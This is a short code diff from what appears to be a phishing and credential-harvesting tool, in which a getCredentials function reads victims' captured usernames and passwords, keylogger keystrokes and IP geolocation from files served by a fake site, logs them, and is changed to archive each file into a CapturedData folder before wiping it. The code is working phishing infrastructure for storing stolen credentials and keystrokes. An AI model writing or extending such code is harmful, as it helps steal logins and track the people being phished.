@@ -684,7 +684,7 @@ def getCredentials(port):
             if len(lines) != 0:
                 writeLog('{0}..................................................................'.format(MAIN3, MAIN4))
                 writeLog(_(' {0}[{1} CREDENTIALS FOUND {0}]{1}:\n {0}{2}{1}').format(MAIN2, MAIN3, lines))
-                system('rm -rf Server/www/usernames.txt && touch Server/www/usernames.txt')
+                system('cp Server/www/usernames.txt Server/CapturedData/usernames.txt && rm -rf Server/www/usernames.txt && touch Server/www/usernames.txt')
                 writeLog('{0}..................................................................'.format(MAIN3, MAIN4))
 
         creds.close()
@@ -709,7 +709,7 @@ def getCredentials(port):
                     writeLog(_(' \n{0}Longitude: {2} \nLatitude: {3}{1}').format(MAIN3, MAIN2, longitude, latitude))
                     writeLog(_(' \n{0}ISP: {2} \nCountry: {3}{1}').format(MAIN3, MAIN2, ipinfo['org'], ipinfo['country']))
                     writeLog(_(' \n{0}Region: {2} \nCity: {3}{1}').format(MAIN3, MAIN2, ipinfo['region'], ipinfo['city']))
-                system('rm -rf Server/www/ip.txt && touch Server/www/ip.txt')
+                system('cp Server/www/ip.txt Server/CapturedData/ip.txt && rm -rf Server/www/ip.txt && touch Server/www/ip.txt')
                 writeLog('..................................................................'.format(MAIN0, MAIN4))
 
         creds.close()
@@ -719,7 +719,7 @@ def getCredentials(port):
             if len(lines) != 0:
                 writeLog('{0}...............................'.format(MAIN0, MAIN4))
                 writeLog(_(' {1}[{0} GETTING PRESSED KEYS {1}]{1}:\n {0}%s{1}').format(MAIN3, MAIN2) % lines)
-                system('rm -rf Server/www/KeyloggerData.txt && touch Server/www/KeyloggerData.txt')
+                system('cp Server/www/KeyloggerData.txt Server/CapturedData/KeyloggerData.txt && rm -rf Server/www/KeyloggerData.txt && touch Server/www/KeyloggerData.txt')
                 writeLog('{0}...............................'.format(MAIN0, MAIN4))
 
 
